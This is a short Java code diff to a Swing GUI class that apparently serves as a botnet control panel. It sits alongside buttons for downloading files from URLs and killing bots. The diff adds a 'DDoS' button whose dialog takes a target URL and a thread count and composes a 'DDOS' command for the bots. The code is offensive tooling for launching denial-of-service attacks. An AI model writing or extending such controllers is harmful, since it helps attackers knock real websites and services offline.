@@ -33,6 +33,7 @@ public class Gui {
     private JButton downloadFileFromUrlButton;
     private JButton killBotButton;
     private JButton helpButton;
+    private JButton ddosButton;
 
     public Gui() throws Exception {
         setNickAndLogin(getRandomNumber());
@@ -121,6 +122,17 @@ public class Gui {
                 dialog.setSize(600, 200);
                 dialog.setLocationByPlatform(true);
                 dialog.setVisible(true);
+            }
+        });
+        ddosButton.addActionListener(new ActionListener() {
+            @Override
+            public void actionPerformed(ActionEvent e) {
+                DdosGui dialog = new DdosGui();
+                dialog.setTitle("DDos");
+                dialog.setSize(600, 200);
+                dialog.setLocationByPlatform(true);
+                dialog.setVisible(true);
+                commandTextField1.setText("DDOS " + dialog.getUrl() + " " + dialog.getNumOfThreads());
             }
         });
     }
